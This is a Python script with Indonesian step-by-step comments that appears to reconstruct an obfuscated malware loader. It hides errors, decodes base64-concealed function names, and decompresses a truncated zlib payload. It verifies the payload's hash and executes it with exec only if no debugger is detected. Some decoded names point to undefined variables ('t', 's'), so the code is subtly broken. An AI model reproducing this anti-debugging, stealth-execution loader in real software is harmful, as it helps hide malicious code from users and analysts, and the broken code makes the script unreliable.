import sys
import base64
import zlib
import types
import builtins
import hashlib
import os
import warnings

# --- Langkah 1: Menonaktifkan peringatan dan menyembunyikan error ---
warnings.filterwarnings("ignore")
sys.stderr = open(os.devnull, "w")

# --- Langkah 2: Membongkar string dan fungsi yang disembunyikan ---
eval_func = eval
base64_decode = base64.b64decode

# Mendapatkan referensi fungsi dari string yang di-decode
types_FunctionType = eval_func(base64_decode('dC5GdW5jdGlvblR5cGUK').decode().strip())
compile_func = eval_func(base64_decode('Y29tcGlsZQo=').decode().strip())
zlib_decompress = eval_func(base64_decode('emxpYi5kZWNvbXByZXNzCg==').decode().strip())
sys_gettrace = eval_func(base64_decode('cy5nZXR0cmFjZQo=').decode().strip())
sys_exit = eval_func(base64_decode('cy5leGl0Cg==').decode().strip())

# --- Variabel Sampah (Tidak Digunakan) ---
# lI1lIII1ll = ['==0;', ';x0^', '1=11', ...] # Ini hanya untuk mengacaukan

# --- Langkah 3: Mendekripsi Payload Utama (Lapisan Kedua) ---
# Payload berada di dalam string base64 yang panjang (saya potong untuk contoh)
encrypted_payload_b64_layer2 = 'eJwkmkdv81BzRv/Kt8uCL3DZC4IsJFHs........'

# Hash yang diharapkan untuk payload ini
expected_hash_layer2 = '10c6570cc783dcc0685c768c19de1ff068e0a2f20b647d6cb4188e61efa3b524'

# Proses dekripsi:
# 1. Base64 decode
# 2. Zlib decompress
decrypted_payload_code_layer2 = zlib_decompress(base64_decode(encrypted_payload_b64_layer2)).decode()

# --- Langkah 4: Pemeriksaan Integritas dan Anti-Debugging ---
# Menghitung hash SHA256 dari payload yang telah didekripsi
calculated_hash_layer2 = hashlib.sha256(decrypted_payload_code_layer2.encode()).hexdigest()

# --- Langkah 5: Eksekusi Kondisional ---
# Payload hanya akan dijalankan jika aman (tidak ada debugger dan hash cocok)
if not sys_gettrace() and calculated_hash_layer2 == expected_hash_layer2:
    # Kompilasi kode payload menjadi objek fungsi
    payload_function_layer2 = types_FunctionType(
        compile_func(decrypted_payload_code_layer2, '<payload_layer2>', 'exec'),
        {
            '__name__': '__main__',
            '__builtins__': builtins,
            '__file__': sys.argv[0]
        }
    )
    # Jalankan payload
    payload_function_layer2()
else:
    # Jika tidak aman, keluar
    sys_exit()
